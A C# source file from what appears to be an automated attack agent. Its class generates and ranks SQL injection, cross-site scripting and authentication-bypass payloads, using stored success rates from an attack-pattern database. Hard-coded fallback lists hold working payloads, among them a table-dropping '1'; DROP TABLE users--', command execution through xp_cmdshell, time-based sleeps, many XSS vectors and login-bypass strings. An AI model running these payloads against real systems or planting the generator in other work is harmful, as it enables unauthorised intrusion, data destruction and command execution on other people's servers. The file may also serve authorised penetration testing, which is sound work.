using AttackAgent.Data;
using AttackAgent.Models;
using Serilog;

namespace AttackAgent.Services
{
    /// <summary>
    /// Generates context-aware payloads using RAG (Retrieval-Augmented Generation)
    /// Queries existing attack pattern database for similar successful attacks
    /// </summary>
    public class RAGPayloadGenerator : IDisposable
    {
        private readonly AttackPatternDatabase _database;
        private readonly ILogger _logger;
        private bool _disposed = false;

        public RAGPayloadGenerator(string databasePath = "attack_patterns.db")
        {
            _database = new AttackPatternDatabase(databasePath);
            _logger = Log.ForContext<RAGPayloadGenerator>();
        }

        /// <summary>
        /// Generates SQL injection payloads based on technology and past successes
        /// </summary>
        public async Task<List<string>> GenerateSqlInjectionPayloadsAsync(
            string technology, 
            string endpoint, 
            string parameterName)
        {
            var payloads = new List<string>();

            try
            {
                // Step 1: Retrieve similar successful patterns from database
                var similarPatterns = await _database.GetOptimizedPatternsAsync(technology, VulnerabilityType.SqlInjection);
                
                // Step 2: Get top-performing patterns with success-based weighting
                var weightedPatterns = similarPatterns
                    .Select(p => new
                    {
                        Pattern = p,
                        Weight = CalculatePatternWeight(p, technology)
                    })
                    .Where(wp => wp.Weight > 0.2) // Minimum weight threshold
                    .OrderByDescending(wp => wp.Weight)
                    .Take(15) // Take more patterns for better coverage
                    .ToList();

                // Step 3: Extract payloads with weighted selection
                foreach (var weightedPattern in weightedPatterns)
                {
                    var pattern = weightedPattern.Pattern;
                    var weight = weightedPattern.Weight;
                    
                    // Higher weight = more payloads from this pattern
                    int payloadsToTake = weight > 0.7 ? 3 : (weight > 0.5 ? 2 : 1);
                    
                    var patternPayloads = pattern.Payloads
                        .Where(p => !string.IsNullOrEmpty(p.Payload))
                        .OrderByDescending(p => p.SuccessRate)
                        .Take(payloadsToTake)
                        .ToList();
                    
                    foreach (var attackPayload in patternPayloads)
                    {
                        if (!payloads.Contains(attackPayload.Payload))
                        {
                            payloads.Add(attackPayload.Payload);
                        }
                    }
                }

                _logger.Debug("Retrieved {Count} payloads from database for {Technology}", 
                    payloads.Count, technology);
            }
            catch (Exception ex)
            {
                _logger.Warning(ex, "Error retrieving patterns from database, using defaults");
            }

            // Step 4: Add technology-specific payloads if no database matches or to supplement
            if (payloads.Count == 0)
            {
                payloads.AddRange(GetDefaultSqlInjectionPayloads(technology));
                _logger.Debug("Using default SQL injection payloads for {Technology}", technology);
            }
            else
            {
                // Supplement with defaults to ensure we have enough payloads
                var defaults = GetDefaultSqlInjectionPayloads(technology);
                foreach (var defaultPayload in defaults)
                {
                    if (!payloads.Contains(defaultPayload))
                    {
                        payloads.Add(defaultPayload);
                    }
                }
            }

            // Step 5: Customize payloads for the specific parameter
            var customizedPayloads = payloads.Select(p => CustomizePayload(p, parameterName)).ToList();

            _logger.Information("Generated {Count} SQL injection payloads for {Technology} {Endpoint} (parameter: {Parameter})",
                customizedPayloads.Count, technology, endpoint, parameterName);

            return customizedPayloads;
        }

        /// <summary>
        /// Generates XSS payloads based on context
        /// </summary>
        public async Task<List<string>> GenerateXssPayloadsAsync(
            string technology,
            string endpoint,
            string context) // "html", "attribute", "javascript"
        {
            var payloads = new List<string>();

            try
            {
                // Retrieve similar successful XSS patterns
                var similarPatterns = await _database.GetOptimizedPatternsAsync(technology, VulnerabilityType.ReflectedXss);
                
                // Use success-based weighting for XSS patterns
                var weightedPatterns = similarPatterns
                    .Select(p => new
                    {
                        Pattern = p,
                        Weight = CalculatePatternWeight(p, technology)
                    })
                    .Where(wp => wp.Weight > 0.15) // Lower threshold for XSS
                    .OrderByDescending(wp => wp.Weight)
                    .Take(15)
                    .ToList();

                foreach (var weightedPattern in weightedPatterns)
                {
                    var pattern = weightedPattern.Pattern;
                    var weight = weightedPattern.Weight;
                    
                    int payloadsToTake = weight > 0.6 ? 3 : (weight > 0.4 ? 2 : 1);
                    
                    var patternPayloads = pattern.Payloads
                        .Where(p => !string.IsNullOrEmpty(p.Payload))
                        .OrderByDescending(p => p.SuccessRate)
                        .Take(payloadsToTake)
                        .ToList();
                    
                    foreach (var attackPayload in patternPayloads)
                    {
                        if (!payloads.Contains(attackPayload.Payload))
                        {
                            payloads.Add(attackPayload.Payload);
                        }
                    }
                }

                _logger.Debug("Retrieved {Count} XSS payloads from database for {Technology}", 
                    payloads.Count, technology);
            }
            catch (Exception ex)
            {
                _logger.Warning(ex, "Error retrieving XSS patterns from database, using defaults");
            }

            // Add context-specific payloads
            var contextPayloads = GetDefaultXssPayloads(technology, context);
            foreach (var payload in contextPayloads)
            {
                if (!payloads.Contains(payload))
                {
                    payloads.Add(payload);
                }
            }

            _logger.Information("Generated {Count} XSS payloads for {Technology} {Endpoint} (context: {Context})",
                payloads.Count, technology, endpoint, context);

            return payloads;
        }

        /// <summary>
        /// Generates authentication bypass payloads
        /// </summary>
        public async Task<List<string>> GenerateAuthBypassPayloadsAsync(
            string technology,
            string endpoint)
        {
            var payloads = new List<string>();

            try
            {
                var similarPatterns = await _database.GetOptimizedPatternsAsync(technology, VulnerabilityType.AuthenticationBypass);
                
                // Use success-based weighting for auth bypass patterns
                var weightedPatterns = similarPatterns
                    .Select(p => new
                    {
                        Pattern = p,
                        Weight = CalculatePatternWeight(p, technology)
                    })
                    .Where(wp => wp.Weight > 0.2)
                    .OrderByDescending(wp => wp.Weight)
                    .Take(12)
                    .ToList();

                foreach (var weightedPattern in weightedPatterns)
                {
                    var pattern = weightedPattern.Pattern;
                    var weight = weightedPattern.Weight;
                    
                    int payloadsToTake = weight > 0.6 ? 2 : 1;
                    
                    var patternPayloads = pattern.Payloads
                        .Where(p => !string.IsNullOrEmpty(p.Payload))
                        .OrderByDescending(p => p.SuccessRate)
                        .Take(payloadsToTake)
                        .ToList();
                    
                    foreach (var attackPayload in patternPayloads)
                    {
                        if (!payloads.Contains(attackPayload.Payload))
                        {
                            payloads.Add(attackPayload.Payload);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.Warning(ex, "Error retrieving auth bypass patterns from database, using defaults");
            }

            // Add default auth bypass payloads
            var defaults = GetDefaultAuthBypassPayloads(technology);
            foreach (var payload in defaults)
            {
                if (!payloads.Contains(payload))
                {
                    payloads.Add(payload);
                }
            }

            return payloads;
        }

        /// <summary>
        /// Gets default SQL injection payloads when no database matches
        /// </summary>
        private List<string> GetDefaultSqlInjectionPayloads(string technology)
        {
            var basePayloads = new List<string>
            {
                "1' OR '1'='1",
                "1' OR '1'='1'--",
                "1' OR '1'='1'/*",
                "1' OR '1'='1'#",
                "1' UNION SELECT NULL--",
                "1'; DROP TABLE users--",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "1' OR 1=1--",
                "1' OR 1=2--",
                "admin'--",
                "admin'/*",
                "admin'#",
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'/*",
                "' OR '1'='1'#",
                "') OR ('1'='1",
                "') OR ('1'='1'--",
                "') OR ('1'='1'/*",
                "1 OR 1=1",
                "1 OR 1=1--",
                "1 OR 1=1/*"
            };

            // Technology-specific additions
            return technology.ToLower() switch
            {
                "asp.net" or "c#" or ".net" => basePayloads.Concat(new List<string>
                {
                    "1'; EXEC xp_cmdshell('dir')--",
                    "1'; EXEC sp_executesql('SELECT 1')--",
                    "1' UNION SELECT NULL, NULL, NULL--"
                }).ToList(),
                "node.js" or "express" or "javascript" => basePayloads.Concat(new List<string>
                {
                    "1'; SELECT pg_sleep(5)--",
                    "1' UNION SELECT NULL, NULL--"
                }).ToList(),
                "php" => basePayloads.Concat(new List<string>
                {
                    "1' UNION SELECT NULL, NULL, NULL--",
                    "1' AND SLEEP(5)--"
                }).ToList(),
                "python" or "django" or "flask" => basePayloads.Concat(new List<string>
                {
                    "1' UNION SELECT NULL, NULL--",
                    "1'; SELECT pg_sleep(5)--"
                }).ToList(),
                _ => basePayloads
            };
        }

        /// <summary>
        /// Gets default XSS payloads based on context
        /// </summary>
        private List<string> GetDefaultXssPayloads(string technology, string context)
        {
            var basePayloads = new List<string>();

            if (context == "html" || string.IsNullOrEmpty(context))
            {
                basePayloads.AddRange(new[]
                {
                    "<script>alert(1)</script>",
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "<body onload=alert(1)>",
                    "<iframe src=javascript:alert(1)>",
                    "<input onfocus=alert(1) autofocus>",
                    "<select onfocus=alert(1) autofocus>",
                    "<textarea onfocus=alert(1) autofocus>",
                    "<keygen onfocus=alert(1) autofocus>",
                    "<video><source onerror=alert(1)>",
                    "<audio src=x onerror=alert(1)>"
                });
            }

            if (context == "attribute" || string.IsNullOrEmpty(context))
            {
                basePayloads.AddRange(new[]
                {
                    "\"><script>alert(1)</script>",
                    "'><script>alert(1)</script>",
                    "\"><img src=x onerror=alert(1)>",
                    "'><img src=x onerror=alert(1)>",
                    "\" onerror=alert(1)>",
                    "' onerror=alert(1)>",
                    "\" onload=alert(1)>",
                    "' onload=alert(1)>"
                });
            }

            if (context == "javascript" || string.IsNullOrEmpty(context))
            {
                basePayloads.AddRange(new[]
                {
                    "javascript:alert(1)",
                    "javascript:alert('XSS')",
                    "';alert(1);//",
                    "\";alert(1);//",
                    "';alert(1);'",
                    "\";alert(1);\""
                });
            }

            return basePayloads.Distinct().ToList();
        }

        /// <summary>
        /// Gets default authentication bypass payloads
        /// </summary>
        private List<string> GetDefaultAuthBypassPayloads(string technology)
        {
            return new List<string>
            {
                "admin",
                "administrator",
                "admin'--",
                "admin'/*",
                "admin'#",
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'/*",
                "' OR '1'='1'#",
                "') OR ('1'='1",
                "') OR ('1'='1'--",
                "admin' OR '1'='1",
                "admin' OR '1'='1'--",
                "admin' OR '1'='1'/*",
                "admin' OR '1'='1'#",
                "admin' OR '1'='1' OR ''='",
                "' OR 1=1--",
                "' OR 1=1/*",
                "' OR 1=1#",
                "' OR 'a'='a",
                "' OR 'a'='a'--",
                "' OR 'a'='a'/*",
                "' OR 'a'='a'#"
            };
        }

        /// <summary>
        /// Calculates pattern weight based on success rate, usage count, and technology match
        /// Higher weight = more likely to succeed
        /// </summary>
        private double CalculatePatternWeight(AttackPattern pattern, string targetTechnology)
        {
            double weight = 0.0;
            
            // Base weight from success rate (0.0 to 1.0)
            weight += pattern.SuccessRate * 0.6;
            
            // Usage count bonus (more usage = more reliable, but diminishing returns)
            double usageBonus = Math.Min(Math.Log(pattern.UsageCount + 1) / 10.0, 0.2);
            weight += usageBonus;
            
            // Technology match bonus
            if (pattern.TargetTechnologies != null && pattern.TargetTechnologies.Any())
            {
                bool technologyMatch = pattern.TargetTechnologies.Any(t => 
                    targetTechnology.Contains(t, StringComparison.OrdinalIgnoreCase) ||
                    t.Contains(targetTechnology, StringComparison.OrdinalIgnoreCase));
                
                if (technologyMatch)
                {
                    weight += 0.2; // Technology-specific bonus
                }
            }
            
            // Recency bonus (recently used patterns get slight boost)
            if (pattern.LastUsed.HasValue)
            {
                var daysSinceLastUse = (DateTime.UtcNow - pattern.LastUsed.Value).TotalDays;
                if (daysSinceLastUse < 7)
                {
                    weight += 0.1 * (1.0 - daysSinceLastUse / 7.0); // Up to 0.1 bonus
                }
            }
            
            // Cap at 1.0
            return Math.Min(weight, 1.0);
        }

        /// <summary>
        /// Customizes a payload for a specific parameter
        /// </summary>
        private string CustomizePayload(string payload, string parameterName)
        {
            // Replace generic placeholders with parameter name
            return payload
                .Replace("{param}", parameterName)
                .Replace("{PARAM}", parameterName.ToUpper())
                .Replace("{Param}", char.ToUpper(parameterName[0]) + parameterName.Substring(1));
        }

        public void Dispose()
        {
            if (!_disposed)
            {
                _database?.Dispose();
                _disposed = true;
            }
        }
    }
}











